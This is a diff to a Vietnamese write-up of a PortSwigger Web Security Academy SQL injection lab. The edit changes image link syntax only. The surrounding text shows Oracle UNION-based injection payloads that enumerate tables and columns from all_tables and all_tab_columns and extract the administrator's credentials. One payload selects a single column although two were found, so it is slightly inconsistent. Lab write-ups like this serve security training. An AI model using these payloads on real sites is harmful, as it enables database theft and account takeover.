@@ -1,4 +1,4 @@
-![[Pasted image 20260604130308.png]]
+![Giao diện lab ban đầu](images/Pasted%20image%2020260604130308.png)
 # Tổng quan về lab
 -Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào Gifts thì ta thấy ở url:
 ```LINK
@@ -23,19 +23,19 @@ https://0a4000a40431b62780050890009800ef.web-security-academy.net/filter?categor
 ```SQL
 ' UNION SELECT 'abc','xyz' FROM dual--
 ```
-![[Pasted image 20260604131217.png]]
+![Kiểm tra kiểu dữ liệu với FROM dual](images/Pasted%20image%2020260604131217.png)
 => 2 cột đều có kiểu dữ liệu text.Ta tiến hành `UNION SELECT` để solve bài lab:
 ```SQL
 ' UNION SELECT table_name FROM all_tables--
 ```
-![[Pasted image 20260604131700.png]]
+![Lấy danh sách bảng từ all_tables](images/Pasted%20image%2020260604131700.png)
 -Ta tiếp tục `Ctrl+F` tìm `Users` thì ta phát hiện ra bảng `USERS_FXFWLU` 
 
 -Tiếp theo,ta tiếp tục `UNION SELECT` để lấy tên các cột:
 ```SQL
 	' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_FXFWLU'--
 ```
-![[Pasted image 20260604132414.png]]
+![Lấy tên cột từ all_tab_columns](images/Pasted%20image%2020260604132414.png)
 Ta thành công lấy được username với password của administrator.Việc còn lại của ta là đăng nhập thôi :v
-![[Pasted image 20260604132530.png]]
+![Đăng nhập administrator thành công](images/Pasted%20image%2020260604132530.png)
 =>solved!
